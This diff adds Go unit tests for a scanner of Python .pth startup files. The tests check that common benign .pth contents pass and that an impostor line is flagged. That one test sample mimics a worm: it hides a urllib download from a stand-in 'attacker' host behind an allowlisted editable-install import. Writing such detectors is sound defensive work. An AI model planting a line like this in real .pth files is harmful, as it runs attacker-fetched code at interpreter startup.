@@ -68,3 +68,35 @@ func mustContain(t *testing.T, hay, needle string) {
 	t.Helper()
 	require.True(t, strings.Contains(hay, needle), "expected %q in %q", needle, hay)
 }
+
+func TestInspectAllowsDistutilsPrecedence(t *testing.T) {
+	body := `import os; var = os.environ.get('SETUPTOOLS_USE_DISTUTILS', 'local'); __import__('_distutils_hack').add_shim()`
+	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "distutils-precedence.pth"})
+	require.False(t, v.Flagged(), "got %v", codes(v))
+}
+
+func TestInspectAllowsBareDistutilsHack(t *testing.T) {
+	body := `import os; __import__('_distutils_hack').add_shim()`
+	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "distutils-precedence.pth"})
+	require.False(t, v.Flagged())
+}
+
+func TestInspectAllowsPEP660Editable(t *testing.T) {
+	body := `import __editable___my_pkg_0_1_0_finder; __editable___my_pkg_0_1_0_finder.install()`
+	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "__editable__.my_pkg-0.1.0.pth"})
+	require.False(t, v.Flagged())
+}
+
+func TestInspectAllowsLegacyEasyInstall(t *testing.T) {
+	body := `import sys; sys.__plen = len(sys.path)`
+	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "easy-install.pth"})
+	require.False(t, v.Flagged())
+}
+
+func TestInspectRejectsAllowlistImpostor(t *testing.T) {
+	// A worm that mentions __editable__ but otherwise smuggles payload-shaped
+	// content past the anchored allowlist must still be flagged.
+	body := `import __editable___finder; import urllib.request; urllib.request.urlretrieve('http://attacker/x','x')`
+	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n")})
+	require.True(t, v.Flagged())
+}
